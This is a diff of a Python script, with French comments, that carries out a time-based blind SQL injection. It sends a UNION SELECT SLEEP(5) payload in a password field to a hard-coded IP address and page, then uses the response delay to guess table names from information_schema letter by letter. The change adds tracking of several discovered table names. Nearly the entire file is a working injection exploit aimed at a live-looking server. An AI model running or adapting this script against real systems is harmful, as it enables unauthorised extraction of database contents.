@@ -3,12 +3,22 @@ import time
 
 def table_name():
     dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","_"]
+    tables_name=[]
     a=0
     texte = ""
     TIME = 5
     url = "http://51.15.136.118/pageid.php"
-    for i in range(1, 99):
+    for i in range(1, 50):
         for j in range(0, len(dictionary)):
+            if a > 27:
+                """enlever """
+                rm_letter = texte[0]
+                dictionary.remove(rm_letter)
+                print(dictionary)
+                tables_name.append(texte)
+                texte = ""
+                a=0
+                break
             usr = "idc"
             """faire la meme chose avec les ,1,2 qui change en fonction du nombre de tables"""
             passwd = "' UNION SELECT SLEEP(5),1,2 TABLE_NAME FROM information_schema.tables WHERE table_schema='nom_user_db' AND TABLE_NAME like '" + texte + dictionary[j] + "%' -- "
@@ -20,10 +30,10 @@ def table_name():
             """print(total_time)
             print(dictionary[j])"""
             a += 1
+            print(texte)
+            print(tables_name)
             print(a)
-            if a > 27:
-                """enlever """
-                dictionary.remove[texte[1]]
+            
             if total_time >= TIME:
                 texte += dictionary[j]
                 print(texte)
@@ -31,6 +41,7 @@ def table_name():
                 j = 0
                 a = 0
                 break
+    print(tables_name)
     return(texte)
 
 table_name()
